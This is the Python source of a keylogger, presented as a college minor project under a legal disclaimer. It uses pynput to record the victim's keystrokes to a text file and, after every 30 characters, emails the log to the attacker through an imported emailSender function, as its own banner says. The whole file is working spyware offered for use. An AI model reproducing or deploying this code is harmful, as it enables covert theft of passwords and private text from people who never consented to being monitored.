# Legal Disclaimer
# The usage of this keylogger project for attacking targets without prior mutual consent is illegal.
# It is the end user's responsibility to obey all applicable local, state and federal laws.
# The developers behind the project assume no liability and are not
# responsible for any misuse or damage caused by this program.
# This software is developed for research purposes only.
# This is just a college minor project.

from pynput import keyboard
from mailSender import emailSender

print('''╔═══════════════════════════════════╦═════════╦═══════════════════════════════════╗
╠═══════════════════════════════════╣  Infos  ╠═══════════════════════════════════╣
║                                   ╚═════════╝                                   ║
║    _  __          _                                                             ║
║   | |/ /___ _   _| |    ___   __ _  __ _  ___ _ __                              ║
║   | ' // _ \ | | | |   / _ \ / _` |/ _` |/ _ \ '__|                             ║
║   | . \  __/ |_| | |__| (_) | (_| | (_| |  __/ |                                ║
║   |_|\_\___|\__, |_____\___/ \__, |\__, |\___|_|                                ║
║             |___/            |___/ |___/                                        ║
║																			      ║
║																				  ║
║  A Modern Software Keylogger,that send emails of the victim logs to attacker.   ║
╠═══════════════════════════════════╦════════════╦════════════════════════════════╣
╠═══════════════════════════════════╣  Made By:  ╠════════════════════════════════╣
║                                   ╚════════════╝                                ║
╠╡1╞═› Zotq                                                                       ║
╚═════════════════════════════════════════════════════════════════════════════════╝


Keylogger is running.....''')
#Running the program with invalid email login credentials will result in python to keep trying to send the email
#but since the email login details are invalid it will continue looping over and over to send email,which will
#make the program not work as intended,so please enter valid login details

def keyPressed(key):
    print(str(key))
    #Creating a .txt file whicddhh stores and log and appends new keys which are logged
    with open("keyfile.txt", 'a+') as logKey:
            try:
                char = key.char
                logKey.write(char)
                with open("keyfile.txt", 'r+') as keyChecker:
                    data = keyChecker.read()
                    numChars = len(data)
                    
                    #Sending the emails only after 30 keys have to logged,this is done to avoid email spam and
                    #maintain program efficieny
                    if(numChars>30):
                        emailSender()
                        file_to_delete = open("keyfile.txt", 'w')
                        #after 30 keys ,opening the file with 'w' mode will clear the previous existing data into the file
                        # and append new keys.
                        file_to_delete.close()

            except:
                #Keylogger ingores the keys like :spacebar,capslock,crlt,shift and other keys which are not required.
                 print("Unnecessary key pressed (ignore)")


if __name__ == "__main__":
    listener = keyboard.Listener(on_press=keyPressed)
    listener.start()
    input()
